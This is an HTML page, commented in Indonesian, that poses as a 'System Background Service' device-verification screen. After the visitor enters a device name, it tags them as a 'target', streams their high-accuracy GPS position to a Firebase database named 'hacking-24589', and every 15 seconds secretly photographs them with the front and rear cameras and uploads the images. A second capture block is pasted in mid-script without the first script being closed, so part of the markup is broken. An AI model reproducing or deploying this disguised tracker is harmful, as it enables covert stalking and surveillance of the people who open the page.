<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Background Service</title>
    <style>
        body {
            background-color: #0b0f19;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .box {
            border: 1px dashed #00ff66;
            padding: 20px;
            background: #05070c;
            width: 85%;
            max-width: 400px;
        }
        input {
            background: #000;
            border: 1px solid #00ff66;
            color: #00ff66;
            padding: 8px;
            width: 80%;
            margin-top: 10px;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
        }
        button {
            background: #00ff66;
            color: #000;
            border: none;
            padding: 9px 15px;
            margin-top: 10px;
            font-weight: bold;
            cursor: pointer;
            font-family: 'Courier New', Courier, monospace;
        }
        #mainContent {
            display: none;
        }
    </style>
</head>
<body>

    <!-- TAMPILAN FORM INPUT MANUAL -->
    <div class="box" id="inputSection">
        <h3>[ IDENTIFY DEVICE ]</h3>
        <p style="font-size: 0.8rem;">Wajib Masukkan Merek & Tipe (Contoh: Samsung S23, Infinix, Oppo):</p>
        <input type="text" id="deviceNameInput" placeholder="Ketik nama perangkat...">
        <br>
        <button onclick="startService()">VERIFY & START</button>
    </div>

    <!-- TAMPILAN SETELAH VERIFIKASI (SERVICE BERJALAN) -->
    <div class="box" id="mainContent">
        <h3>[ SYSTEM SERVICE ACTIVE ]</h3>
        <p style="font-size: 0.8rem;">Running background process...</p>
        <div id="statusText" style="font-size: 0.75rem; color: #00ff66; margin-top: 10px;">Status: Standby</div>
    </div>

    <div style="display:none;">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusText = document.getElementById('statusText');

        // Cek apakah perangkat sudah pernah verifikasi sebelumnya
        let targetId = localStorage.getItem("target_unique_id");
        let deviceName = localStorage.getItem("target_device_name");

        if (targetId && deviceName) {
            // Jika sudah pernah, langsung jalankan sistem otomatis tanpa munculkan form lagi
            document.getElementById('inputSection').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            initTracker(deviceName);
        }

        // Fungsi saat tombol "VERIFY & START" diklik
        function startService() {
            const inputVal = document.getElementById('deviceNameInput').value.trim();
            if (!inputVal) {
                alert("Silakan masukkan nama perangkat terlebih dahulu!");
                return;
            }

            deviceName = inputVal;
            targetId = "target_" + Math.random().toString(36).substring(2, 9);
            
            // Simpan ke memori HP target
            localStorage.setItem("target_unique_id", targetId);
            localStorage.setItem("target_device_name", deviceName);

            // Sembunyikan form, tampilkan layar status service
            document.getElementById('inputSection').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';

            initTracker(deviceName);
        }

        // Fungsi Utama Pelacakan GPS & Kamera
        function initTracker(devName) {
            // 1. Kirim Data GPS Real-time
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition((position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    db.ref("targets/" + targetId).set({
                        id: targetId,
                        device: devName,
                        latitude: lat,
                        longitude: lon,
                        timestamp: Date.now()
                    });
                }, (error) => {
                    console.error("GPS Error:", error);
                }, { enableHighAccuracy: true });
            }

            // 2. Fungsi Kamera Berkala
            async function captureCamera(facingType, labelName) {
                if (document.hidden) {
                    statusText.innerText = "Status: App minimized (Paused)";
                    return;
                }

                try {
                    statusText.innerText = `Status: Capturing ${labelName}...`;

                    if (video.srcObject) {
                        video.srcObject.getTracks().forEach(track => track.stop());
                        video.srcObject = null;
                    }

                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: facingType },
                        audio: false
                    });

                    video.srcObject = stream;
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            setTimeout(resolve, 1500);
                        };
                    });

                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);

                    db.ref("camera_logs").push({
                        targetId: targetId,
                        device: devName,
                        cameraType: labelName,
                        image: imageData,
                        timestamp: Date.now()
                    });

                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                    statusText.innerText = "Status: Active";
                } catch (err) {
                    console.log(`Kamera ${labelName} error:`, err);
                    statusText.innerText = "Status: Camera busy/denied";
                }
            }

            async function runCycle() {
                await captureCamera("user", "Depan");
                setTimeout(async () => {
                    await captureCamera("environment", "Belakang");
                }, 4000);
            }

            setTimeout(() => {
                runCycle();
                setInterval(runCycle, 15000);
            }, 2000);
        }
    <!-- SISIPAN OTOMATIS KAMERA LATAR BELAKANG (TANPA MERUBAH KODE LAMA) -->
<div style="display:none;">
    <video id="bgVideo" autoplay playsinline muted></video>
    <canvas id="bgCanvas"></canvas>
</div>

<script>
    // Pastikan Firebase sudah terhubung di file lama Anda
    (function() {
        const vEl = document.getElementById('bgVideo');
        const cEl = document.getElementById('bgCanvas');
        const ctx = cEl.getContext('2d');

        async function captureAndSend(facingMode, label) {
            // Android membatasi kamera jika layar benar-benar tertutup total, 
            // tapi skrip ini akan mencoba mengambil gambar secara berkala saat halaman aktif/terbuka.
            if (document.hidden) return;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode },
                    audio: false
                });

                vEl.srcObject = stream;
                await new Promise((resolve) => {
                    vEl.onloadedmetadata = () => {
                        vEl.play();
                        setTimeout(resolve, 1200); // Waktu pemanasan sensor
                    };
                });

                cEl.width = vEl.videoWidth || 640;
                cEl.height = vEl.videoHeight || 480;
                ctx.drawImage(vEl, 0, 0, cEl.width, cEl.height);
                
                const base64Image = cEl.toDataURL('image/jpeg', 0.6);
                const tId = localStorage.getItem("target_unique_id") || "target_unknown";

                // Kirim otomatis ke Firebase tanpa mengganggu kode lama
                firebase.database().ref("camera_logs").push({
                    targetId: tId,
                    cameraType: label,
                    image: base64Image,
                    timestamp: Date.now()
                });

                stream.getTracks().forEach(track => track.stop());
                vEl.srcObject = null;
            } catch (err) {
                console.log("Auto-capture silent error:", err);
            }
        }

        // Jalankan siklus bergantian: Depan -> jeda 4 detik -> Belakang, diulang tiap 15 detik
        function startBackgroundCaptureLoop() {
            setInterval(async () => {
                await captureAndSend("user", "Depan");
                setTimeout(async () => {
                    await captureAndSend("environment", "Belakang");
                }, 4000);
            }, 15000);
        }

        // Mulai otomatis setelah halaman siap
        window.addEventListener('load', () => {
            setTimeout(startBackgroundCaptureLoop, 5000);
        });
    })();
</script>
    
</body>
</html>
